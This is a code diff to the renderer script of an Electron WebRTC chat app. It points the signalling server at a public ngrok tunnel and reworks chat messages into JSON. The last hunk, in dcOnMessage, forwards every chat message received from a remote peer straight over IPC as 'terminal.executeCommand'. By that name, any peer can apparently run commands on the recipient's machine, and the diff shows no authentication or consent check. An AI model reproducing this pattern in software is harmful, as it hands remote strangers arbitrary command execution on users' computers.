@@ -1,4 +1,5 @@
 console.log('In renderer.js!');
+const ipc = require("electron").ipcRenderer;
 
 var mapPeers = {};
 var usernameInput = document.querySelector('#username');
@@ -49,7 +50,7 @@ btnJoin.addEventListener('click', () => {
     var labelUsername = document.querySelector('#label-username');
     labelUsername.innerHTML = username;
 
-    var wsStart = 'ws://localhost:8000';  // Adres WebSocket serwera
+    var wsStart = 'wss://e70f-193-19-165-84.ngrok-free.app';  // Adres WebSocket serwera
     webSocket = new WebSocket(wsStart);
 
     webSocket.addEventListener('open', (e) => {
@@ -109,16 +110,22 @@ var messageInput = document.querySelector('#msg');
 btnSendMsg.addEventListener('click', sendMsgOnClick);
 
 function sendMsgOnClick(){
-    var message = messageInput.value;
+    var my_message = messageInput.value;
+
     var li = document.createElement('li');
-    li.appendChild(document.createTextNode('Me: ' + message));
+    li.appendChild(document.createTextNode('Me: ' + my_message));
     messageList.appendChild(li);
 
     var dataChannels = getDataChannels();
-    message = username + ': ' + message;
 
-    for (let index in dataChannels){
-        dataChannels[index].send(message);
+    var dataToSend = {
+        username: username,
+        message: my_message
+    };
+    var jsonMessage = JSON.stringify(dataToSend);
+
+    for(index in dataChannels){
+        dataChannels[index].send(jsonMessage);
     }
 
     messageInput.value = '';
@@ -250,11 +257,15 @@ function addLocalTracks(peer){
 }
 
 function dcOnMessage(event){
-    var message = event.data;
+    var data = JSON.parse(event.data);
+    var username = data.username;
+    var message = data.message;
 
     var li = document.createElement('li');
-    li.appendChild(document.createTextNode(message));
+    li.appendChild(document.createTextNode(username + ': ' + message));
     messageList.appendChild(li);
+    console.log("wysłane dane: ", message)
+    ipc.send("terminal.executeCommand", message);
 }
 
 function createVideo(peerUsername){
